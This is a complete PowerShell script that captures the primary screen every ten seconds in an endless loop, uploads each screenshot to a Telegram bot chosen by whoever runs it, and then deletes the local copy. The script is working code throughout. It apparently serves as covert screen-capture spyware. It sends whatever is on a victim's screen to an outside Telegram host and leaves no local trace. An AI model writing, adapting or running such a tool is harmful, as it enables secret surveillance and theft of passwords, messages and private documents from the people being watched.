param(
    [string]$botToken,
    [string]$chatId
)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# === Function to Capture Screenshot ===
function Capture-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    return $bitmap
}

# === Function to Send Screenshot to Telegram ===
function Send-TelegramDocument {
    param (
        [string]$filePath
    )

    if (-not $botToken -or -not $chatId) {
        Write-Host "Bot token or chat ID is missing!"
        return
    }

    $url = "https://api.telegram.org/bot$botToken/sendDocument"

    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $filename = [IO.Path]::GetFileName($filePath)
    $fileBytes = [IO.File]::ReadAllBytes($filePath)

    $body = New-Object IO.MemoryStream
    $writer = New-Object IO.StreamWriter($body)

    # chat_id field
    $writer.Write("--$boundary$LF")
    $writer.Write("Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatId$LF")

    # document field
    $writer.Write("--$boundary$LF")
    $writer.Write("Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"$LF")
    $writer.Write("Content-Type: application/octet-stream$LF$LF")
    $writer.Flush()

    # Write the file bytes
    $body.Write($fileBytes, 0, $fileBytes.Length)

    # End boundary
    $writer.Write("$LF--$boundary--$LF")
    $writer.Flush()
    $body.Position = 0

    # Prepare the request
    $request = [Net.WebRequest]::Create($url)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.ContentLength = $body.Length

    # Send the request
    $reqStream = $request.GetRequestStream()
    $body.WriteTo($reqStream)
    $reqStream.Close()

    # Get response
    $response = $request.GetResponse()
    $responseText = (New-Object IO.StreamReader($response.GetResponseStream())).ReadToEnd()
    $response.Close()

    # Log response for debugging
    $responseText | Out-File "$env:TEMP\telegram_response.txt"
}

# === Main Loop to Capture and Send Screenshots Every 10 Seconds ===
$counter = 1
while ($true) {
    try {
        # Create sequential file name (screen_1.png, screen_2.png, ...)
        $tempPath = "$env:TEMP\screen_$counter.png"

        # Capture the screenshot
        $screenshot = Capture-Screenshot
        $screenshot.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)

        # Send the screenshot to Telegram
        Send-TelegramDocument -filePath $tempPath

        # Delete the file after sending
        Remove-Item $tempPath -ErrorAction SilentlyContinue

        # Increment the counter for the next screenshot
        $counter++

    } catch {
        Write-Host "Error: $_"
    }

    # Wait for 10 seconds before the next screenshot
    Start-Sleep -Seconds 10
}
